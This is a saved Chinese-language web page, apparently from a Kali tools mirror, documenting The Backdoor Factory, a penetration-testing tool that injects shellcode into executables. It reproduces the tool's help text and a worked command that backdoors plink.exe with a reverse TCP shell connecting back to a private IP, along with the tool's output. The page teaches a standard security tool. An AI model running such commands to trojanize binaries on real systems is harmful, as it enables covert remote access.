@@ -1,0 +1,146 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>kali工具箱</title>
+<script src="bootstrap.min.js" tppabs="http://www.storysec.com/kali/kalitools/static/bootstrap.min.js"></script>
+<link rel="stylesheet" href="main.css" tppabs="http://www.storysec.com/kali/kalitools/static/main.css">
+<link rel="stylesheet" href="bootstrap.min.css" tppabs="http://www.storysec.com/kali/kalitools/static/bootstrap.min.css">
+<style type="text/css" id="syntaxhighlighteranchor"></style>
+</head>
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+<article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+<section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+<h2>后门厂包装说明</h2><p style="text-align: justify;"> BDF的目标是修补程序可执行的二进制文件与用户desidered的shellcode并不断的修补前的状态正常执行。 </p><p>支持：Windows PE的X32 / X64和Linux ELF X32 / X64（系统V） </p><p>一些可执行文件有内置的保护，因为在所有的二进制文件这一等将无法正常工作。重要的是，您将它们部署到客户端或利用他们在演习之前测试的目标二进制文件是明智的。 </p><p>资料来源：https://github.com/secretsquirrel/the-backdoor-factory/ <br> <a href="javascript:if(confirm('https://github.com/secretsquirrel/the-backdoor-factory/  \n\n���ļ��޷��� Teleport Ultra ����, ��Ϊ ����һ�����·���ⲿ������Ϊ������ʼ��ַ�ĵ�ַ��  \n\n�����ڷ������ϴ���?'))window.location='https://github.com/secretsquirrel/the-backdoor-factory/'" tppabs="https://github.com/secretsquirrel/the-backdoor-factory/" variation="deepblue" target="blank">借壳工厂首页</a> - <a href="javascript:if(confirm('http://git.kali.org/gitweb/?p=packages/backdoor-factory.git;a=summary  \n\n���ļ��޷��� Teleport Ultra ����, ��Ϊ ����һ�����·���ⲿ������Ϊ������ʼ��ַ�ĵ�ַ��  \n\n�����ڷ������ϴ���?'))window.location='http://git.kali.org/gitweb/?p=packages/backdoor-factory.git;a=summary'" tppabs="http://git.kali.org/gitweb/?p=packages/backdoor-factory.git;a=summary" variation="deepblue" target="blank">卡利后门工厂回购</a> </p><ul><li>作者：约书亚·皮茨</li><li>许可：GPLv3的</li></ul><h3>包括在后门工厂封装工具</h3><h5>借壳工厂 - 补丁的win32 / 64二进制文件的shellcode </h5><code><a class="__cf_email__" href="javascript:if(confirm('http://www.storysec.com/cdn-cgi/l/email-protection  \n\n���ļ��޷��� Teleport Ultra ����, ��Ϊ ����һ�����·���ⲿ������Ϊ������ʼ��ַ�ĵ�ַ��  \n\n�����ڷ������ϴ���?'))window.location='http://www.storysec.com/cdn-cgi/l/email-protection'" tppabs="http://www.storysec.com/cdn-cgi/l/email-protection" data-cfemail="2c5e4343586c474d4045">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# backdoor-factory<br>
+-.(`-')  (`-')  _           &lt;-.(`-') _(`-')                            (`-')<br>
+__( OO)  (OO ).-/  _         __( OO)( (OO ).-&gt;     .-&gt;        .-&gt;   &lt;-.(OO )<br>
+'-'---.\  / ,---.   \-,-----.'-'. ,--.\    .'_ (`-')----. (`-')----. ,------,)<br>
+| .-. (/  | \ /`.\   |  .--./|  .'   /'`'-..__)( OO).-.  '( OO).-.  '|   /`. '<br>
+| '-' `.) '-'|_.' | /_) (`-')|      /)|  |  ' |( _) | |  |( _) | |  ||  |_.' |<br>
+| /`'.  |(|  .-.  | ||  |OO )|  .   ' |  |  / : \|  |)|  | \|  |)|  ||  .   .'<br>
+| '--'  / |  | |  |(_'  '--'\|  |\   \|  '-'  /  '  '-'  '  '  '-'  '|  |\  \<br>
+`------'  `--' `--'   `-----'`--' '--'`------'    `-----'    `-----' `--' '--'<br>
+           (`-')  _           (`-')                   (`-')<br>
+   &lt;-.     (OO ).-/  _        ( OO).-&gt;       .-&gt;   &lt;-.(OO )      .-&gt;<br>
+(`-')-----./ ,---.   \-,-----./    '._  (`-')----. ,------,) ,--.'  ,-.<br>
+(OO|(_\---'| \ /`.\   |  .--./|'--...__)( OO).-.  '|   /`. '(`-')'.'  /<br>
+ / |  '--. '-'|_.' | /_) (`-')`--.  .--'( _) | |  ||  |_.' |(OO \    /<br>
+ \_)  .--'(|  .-.  | ||  |OO )   |  |    \|  |)|  ||  .   .' |  /   /)<br>
+  `|  |_)  |  | |  |(_'  '--'\   |  |     '  '-'  '|  |\  \  `-/   /`<br>
+   `--'    `--' `--'   `-----'   `--'      `-----' `--' '--'   `--'<br>
+<br>
+         Author:    Joshua Pitts<br>
+         Email:     the.midnite.runr[a t]gmail&lt;d o t&gt;com<br>
+         Twitter:   @midnite_runr<br>
+<br>
+         v2.0.6<br>
+<br>
+Usage: backdoor.py [options]<br>
+<br>
+Options:<br>
+  -h, --help            show this help message and exit<br>
+  -f FILE, --file=FILE  File to backdoor<br>
+  -s SHELL, --shell=SHELL<br>
+                        Payloads that are available for use.<br>
+  -H HOST, --hostip=HOST<br>
+                        IP of the C2 for reverse connections<br>
+  -P PORT, --port=PORT  The port to either connect back to for reverse shells<br>
+                        or to listen on for bind shells<br>
+  -J, --cave_jumping    Select this options if you want to use code cave<br>
+                        jumping to further hide your shellcode in the binary.<br>
+  -a, --add_new_section<br>
+                        Mandating that a new section be added to the exe<br>
+                        (better success) but less av avoidance<br>
+  -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE<br>
+                        User supplied shellcode, make sure that it matches the<br>
+                        architecture that you are targeting.<br>
+  -c, --cave            The cave flag will find code caves that can be used<br>
+                        for stashing shellcode. This will print to all the<br>
+                        code caves of a specific size.The -l flag can be use<br>
+                        with this setting.<br>
+  -l SHELL_LEN, --shell_length=SHELL_LEN<br>
+                        For use with -c to help find code caves of different<br>
+                        sizes<br>
+  -o OUTPUT, --output-file=OUTPUT<br>
+                        The backdoor output file<br>
+  -n NSECTION, --section=NSECTION<br>
+                        New section name must be less than seven characters<br>
+  -d DIR, --directory=DIR<br>
+                        This is the location of the files that you want to<br>
+                        backdoor. You can make a directory of file backdooring<br>
+                        faster by forcing the attaching of a codecave to the<br>
+                        exe by using the -a setting.<br>
+  -w, --change_access   This flag changes the section that houses the codecave<br>
+                        to RWE. Sometimes this is necessary. Enabled by<br>
+                        default. If disabled, the backdoor may fail.<br>
+  -i, --injector        This command turns the backdoor factory in a hunt and<br>
+                        shellcode inject type of mechinism. Edit the target<br>
+                        settings in the injector module.<br>
+  -u SUFFIX, --suffix=SUFFIX<br>
+                        For use with injector, places a suffix on the original<br>
+                        file for easy recovery<br>
+  -D, --delete_original<br>
+                        For use with injector module.  This command deletes<br>
+                        the original file.  Not for use in production systems.<br>
+                        *Author not responsible for stupid uses.*<br>
+  -O DISK_OFFSET, --disk_offset=DISK_OFFSET<br>
+                        Starting point on disk offset, in bytes. Some authors<br>
+                        want to obfuscate their on disk offset to avoid<br>
+                        reverse engineering, if you find one of those files<br>
+                        use this flag, after you find the offset.<br>
+  -S, --support_check   To determine if the file is supported by BDF prior to<br>
+                        backdooring the file. For use by itself or with<br>
+                        verbose. This check happens automatically if the<br>
+                        backdooring is attempted.<br>
+  -q, --no_banner       Kills the banner.<br>
+  -v, --verbose         For debug information output.</code><h3>借壳工厂用法示例</h3><p>指定二借壳<b><i>（-f /usr/share/windows-binaries/plink.exe），</i></b>设置连接回<b><i>IP（-H 192.168.1.202），</i></b>在连接回端口<b><i>（-P 4444），</i></b>和外壳使用<b><i>（-s reverse_shell_tcp）：</i></b> </p><code><a class="__cf_email__" href="javascript:if(confirm('http://www.storysec.com/cdn-cgi/l/email-protection  \n\n���ļ��޷��� Teleport Ultra ����, ��Ϊ ����һ�����·���ⲿ������Ϊ������ʼ��ַ�ĵ�ַ��  \n\n�����ڷ������ϴ���?'))window.location='http://www.storysec.com/cdn-cgi/l/email-protection'" tppabs="http://www.storysec.com/cdn-cgi/l/email-protection" data-cfemail="72001d1d063219131e1b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp<br>
+__________                __       .___                   <br>
+\______   \_____    ____ |  | __ __| _/____   ___________ <br>
+ |    |  _/\__  \ _/ ___\|  |/ // __ |/  _ \ /  _ \_  __ \ <br>
+ |    |   \ / __ \\  \___|    &lt;/ /_/ (  &lt;_&gt; |  &lt;_&gt; )  | \/<br>
+ |______  /(____  /\___  &gt;__|_ \____ |\____/ \____/|__|   <br>
+        \/      \/     \/     \/    \/                    <br>
+___________              __                               <br>
+\_   _____/____    _____/  |_  ___________ ___.__.        <br>
+ |    __) \__  \ _/ ___\   __\/  _ \_  __ &lt;   |  |        <br>
+ |     \   / __ \\  \___|  | (  &lt;_&gt; )  | \/\___  |        <br>
+ \___  /  (____  /\___  &gt;__|  \____/|__|   / ____|        <br>
+     \/        \/     \/                   \/             <br>
+<br>
+         Author:    Joshua Pitts<br>
+         Email:     the.midnite.runr[a t]gmail&lt;d o t&gt;com<br>
+         Twitter:   @midnite_runr<br>
+         <br>
+         v2.0.6 <br>
+         <br>
+[*] In the backdoor module<br>
+[*] Checking if binary is supported<br>
+[*] Gathering file info<br>
+[*] Reading win32 entry instructions<br>
+[*] Looking for and setting selected shellcode<br>
+[*] Creating win32 resume execution stub<br>
+[*] Looking for caves that will fit the minimum shellcode length of 358<br>
+[*] All caves lengths:  (358,)<br>
+############################################################<br>
+The following caves can be used to inject code and possibly<br>
+continue execution.<br>
+**Don't like what you see? Use jump, single, or append.**<br>
+############################################################<br>
+[*] Cave 1 length as int: 358<br>
+[*] Available caves: <br>
+1. Section Name: None; Section Begin: None End: None; Cave begin: 0x280 End: 0x1000; Cave Size: 3456<br>
+2. Section Name: .text; Section Begin: 0x1000 End: 0x37000; Cave begin: 0x36981 End: 0x37000; Cave Size: 1663<br>
+3. Section Name: None; Section Begin: None End: None; Cave begin: 0x47cec End: 0x48004; Cave Size: 792<br>
+4. Section Name: .data; Section Begin: 0x48000 End: 0x4a000; Cave begin: 0x48961 End: 0x48b90; Cave Size: 559<br>
+5. Section Name: None; Section Begin: None End: None; Cave begin: 0x4907c End: 0x4a00e; Cave Size: 3986<br>
+**************************************************<br>
+[!] Enter your selection: 2<br>
+Using selection: 2<br>
+[*] Changing Section Flags<br>
+[*] Patching initial entry instructions<br>
+[*] Creating win32 resume execution stub<br>
+[*] /usr/share/windows-binaries/plink.exe backdooring complete<br>
+File /usr/share/windows-binaries/plink.exe is in the 'backdoored' directory</code><div style="display:none">
+<script src="z_stat.php-id=1260038378&web_id=1260038378" tppabs="http://s11.cnzz.com/z_stat.php?id=1260038378&web_id=1260038378" language="JavaScript"></script>
+</div>
+</main></body></html>
